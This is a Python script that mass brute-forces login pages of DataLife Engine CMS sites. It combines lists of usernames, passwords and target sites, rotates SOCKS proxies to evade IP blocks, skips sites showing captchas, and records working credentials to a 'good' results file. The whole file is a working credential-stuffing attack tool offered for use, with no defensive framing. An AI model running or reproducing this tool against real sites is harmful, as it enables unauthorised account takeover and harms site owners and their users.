# -*- coding: utf-8 -*-

import asyncio
import contextlib
from re import match
from ssl import SSLError
from urllib.parse import urlsplit

from aiofiles import open as afile
from aiohttp import ClientSession
from aiohttp_socks import SocksConnector
from async_timeout import timeout as ftime
from bs4 import BeautifulSoup


@contextlib.contextmanager
def silent_out():
    loop = asyncio.get_event_loop()
    old_handler = loop.get_exception_handler()
    old_handler_fn = old_handler

    def ignore_exc(_loop, ctx):
        exc = ctx.get('exception')

        if isinstance(exc, SSLError):
            return

        old_handler_fn(loop, ctx)

    loop.set_exception_handler(ignore_exc)

    try:
        yield
    finally:
        loop.set_exception_handler(old_handler)


async def parse(text, user, passw):
    a = BeautifulSoup(text, features="html.parser")
    b = a.find('select', {'name': 'selected_language'})
    c = b.find('option', selected=True)['value']

    params = {
        'subaction': 'dologin',
        'username': user,
        'password': passw,
        'selected_language': c
    }

    return params


async def macros(p, u, s):
    pattern = r'^(.+?)(?=\.)'
    a = (urlsplit(u).hostname).replace('www.', '')
    a = match(pattern, a)[0]

    p = p.replace('%DOMAIN%', a.upper())
    p = p.replace('%Domain%', a.capitalize())
    p = p.replace(r'%domain%', a.lower())

    if s == '':
        return p

    p = p.replace(r'%username%', s.lower())
    p = p.replace('%Username%', s.capitalize())
    p = p.replace('%USERNAME%', s.upper())

    return p


async def proxy_request():
    async with ClientSession() as s:
        async with s.get(proxy_url) as resp:
            return await (resp.text()).split('\n')


async def save(where, what):
    async with afile(f'rez/{where}.txt', 'a',
                     encoding='utf-8', errors='ignore') as f:
        await f.write(str(what) + '\n')


async def first(s, url):
    async with ftime(timeout):
        async with s.get(url, ssl=False) as r:
            return [await r.text(), r.status]


async def second(s, url, data):
    async with ftime(timeout):
        async with s.post(url, data=data, ssl=False) as r:
            return [await r.text(), r.status]


async def valid(status, text, url):
    if 'IP address has been blocked' in text or status == 403:
        await save('block', url)
        return False
    elif 'selected_language' not in text:
        return False
    elif '"captcha' in text:
        await save('captcha', url)
        return False
    else:
        return True


async def DLE(link, user, passw, proxy):
    global finished, good

    cproxy = SocksConnector.from_url('socks5://' + proxy)

    try:
        user = await macros(user, link, '')
        passw = await macros(passw, link, user)

        with silent_out():
            async with ClientSession(connector=cproxy) as s:
                data = await first(s, link)

                if not await valid(data[1], data[0], link):
                    save('rebrut', f'{link} - {user}:{passw}')
                    return

                _post = await parse(data[0], user, passw)
                data = await second(s, link, _post)
                assert 'action=logout' in data[0]

                good += 1
                await save('good', f'{link} - {user}:{passw}')
    except asyncio.TimeoutError:
        save('timeout', f'{link} - {user}:{passw}')
    except Exception as e:
        save('report', e)
    finally:
        finished += 1
        print(f'Good: {good}; Done: {finished}', end='\r')
        return


async def main():
    tasks = []

    proxies = await proxy_request()
    lenofpr = len(proxies) - 10
    curindx = 0

    async with afile("data/users.txt", encoding="utf-8",
                     errors="ignore") as users:
        async for user in users:
            async with afile("data/passw.txt", encoding="utf-8",
                             errors="ignore") as passws:
                async for passw in passws:
                    async with afile("data/sites.txt", encoding="utf-8",
                                     errors="ignore") as sites:
                        async for site in sites:
                            task = asyncio.create_task(
                                DLE(
                                    site.replace('\n', ''),
                                    user.replace('\n', ''),
                                    passw.replace('\n', ''),
                                    proxies[curindx]
                                )
                            )
                            tasks.append(task)
                            curindx += 1

                            if curindx >= lenofpr:
                                if rotate:
                                    proxies = await proxy_request()
                                    lenofpr = len(proxies) - 10

                                curindx = 0

                            if len(tasks) >= threads:
                                await asyncio.gather(*tasks)
                                tasks = []

    if len(tasks) != 0:
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    good = 0
    finished = 0
    threads = int(input('Threads: '))
    timeout = int(input('Timeout: '))
    proxy_url = input('SOCKS4 Link: ')
    rotate = bool(int(input('Rotate proxy: ')))

    asyncio.run(main())
